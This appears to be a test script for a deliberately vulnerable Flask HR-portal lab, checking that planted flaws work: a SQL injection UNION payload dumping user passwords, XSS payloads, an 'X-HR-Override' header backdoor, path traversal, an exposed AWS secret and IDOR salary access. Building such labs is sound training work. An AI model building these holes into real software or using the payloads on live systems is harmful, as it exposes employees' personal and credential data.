import os
os.environ['DATABASE'] = os.path.join(os.path.dirname(__file__), 'hrportal.db')
import app as a
a.app.testing = True
c = a.app.test_client()

def login(u, p):
    return c.post('/login', data={'username': u, 'password': p}, follow_redirects=True)

results = []
results.append(("login page loads", c.get('/login').status_code == 200))
r = login('j.doe', 'Password1')
results.append(("employee login", r.status_code == 200 and 'Dashboard' in r.get_data(as_text=True)))

payload = "x' UNION SELECT username,password,role,email,department,title,role,salary FROM users-- "
body = c.get('/employees', query_string={'q': payload}).get_data(as_text=True)
results.append(("SQLi UNION data leak", 'admin@northwind-hr.local' in body and 'System Administrator' in body))

r = c.get('/leave', query_string={'filter': '<img src=x onerror=alert(1)>'})
results.append(("reflected XSS (img)", '<img src=x onerror=alert(1)>' in r.get_data(as_text=True)))

c.post('/profile', data={'bio': '<svg/onload=alert(9)>', 'phone': '123'})
results.append(("stored XSS bio (svg)", '<svg/onload=alert(9)>' in c.get('/profile').get_data(as_text=True)))

results.append(("admin blocked for emp", c.get('/admin').status_code == 403))
results.append(("HR header backdoor", c.get('/hr', headers={'X-HR-Override': 'true'}).status_code == 200))
results.append(("path traversal", 'Flask' in c.get('/download', query_string={'file': '../../app.py'}).get_data(as_text=True)))
results.append(("env secret leak", 'AWS_SECRET_ACCESS_KEY' in c.get('/debug/env').get_data(as_text=True)))
results.append(("IDOR salary view", 'Salary' in c.get('/employee/1').get_data(as_text=True)))

# admin login + admin pages
login('admin', 'Admin@123')
results.append(("admin login->admin page", c.get('/admin').status_code == 200))
results.append(("admin tools page", c.get('/admin/ping').status_code == 200))

print("\n=== VULNERABILITY / FUNCTION TEST RESULTS ===")
ok = 0
for name, passed in results:
    print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
    ok += passed
print(f"\n{ok}/{len(results)} checks passed")
